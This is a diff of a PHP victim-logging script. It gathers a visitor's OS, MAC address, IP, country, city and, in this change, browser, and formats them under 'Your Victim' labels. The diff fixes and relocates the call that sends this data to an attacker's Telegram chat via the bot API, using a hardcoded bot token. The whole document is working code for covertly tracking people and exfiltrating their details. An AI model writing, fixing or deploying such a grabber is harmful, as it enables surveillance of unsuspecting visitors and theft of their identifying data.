@@ -1,6 +1,4 @@
 <?php
-
-error_reporting(0);
 //Bot Token + UserID
 
 $bot_token = "854979584:AAGigxt4fyVv0Cp2XZPMk3Ukr-ycTZB-SgU";
@@ -56,6 +54,37 @@ $macaddress=substr($mycomsys,($pmac+36),17);
     return $os_platform;
 }
 
+function getBrowser() {
+    global $user;
+    $browser        =   "Unknown Browser";
+    $browser_array  =   array(
+                            '/msie/i'       =>  'Internet Explorer',
+                            '/firefox/i'    =>  'Firefox',
+							'/Mozilla/i'	=>	'Mozila',
+							'/Mozilla/5.0/i'=>	'Mozila',
+                            '/safari/i'     =>  'Safari',
+                            '/chrome/i'     =>  'Chrome',
+                            '/edge/i'       =>  'Edge',
+                            '/opera/i'      =>  'Opera',
+							'/OPR/i'        =>  'Opera',
+                            '/netscape/i'   =>  'Netscape',
+                            '/maxthon/i'    =>  'Maxthon',
+                            '/konqueror/i'  =>  'Konqueror',
+							'/Bot/i'		=>	'BOT Browser',
+							'/Valve Steam GameOverlay/i'  =>  'Steam',
+                            '/mobile/i'     =>  'Handheld Browser'
+                        );
+    foreach ($browser_array as $regex => $value) {
+        if (preg_match($regex, $user)) {
+            $browser    =   $value;
+        }
+    }
+    return $browser;
+}
+
+    $bro = getBrowser();
+
+
     $os = getOS();
 
  function RealIp() {
@@ -91,6 +120,8 @@ $city = $geo["geoplugin_city"];
  ---------+--------
  Your Victim OS==> <code>$os</code>
  ---------+--------
+ Your Victim Browser==> <code>$bro</code>
+ ---------+--------
  Your Victim Country=> <code>$country</code>
  ---------+--------
  Your Victim City==> <code>$city</code>
@@ -99,11 +130,6 @@ $city = $geo["geoplugin_city"];
  ---------+--------
   ";
 
-
-
-
-
-file_get_contents_curl("https://api.telegram.org/bot$bot_token/SendMessage?parse_mode=HTML&chat_id=$userid&text=".urlencode($textmsg))
 
 function file_get_contents_curl($url) {
     $ch = curl_init();
@@ -119,4 +145,6 @@ function file_get_contents_curl($url) {
 
     return $data;
 }
+
+file_get_contents_curl("https://api.telegram.org/bot$bot_token/SendMessage?parse_mode=HTML&chat_id=$userid&text=".urlencode($textmsg));
 ?>
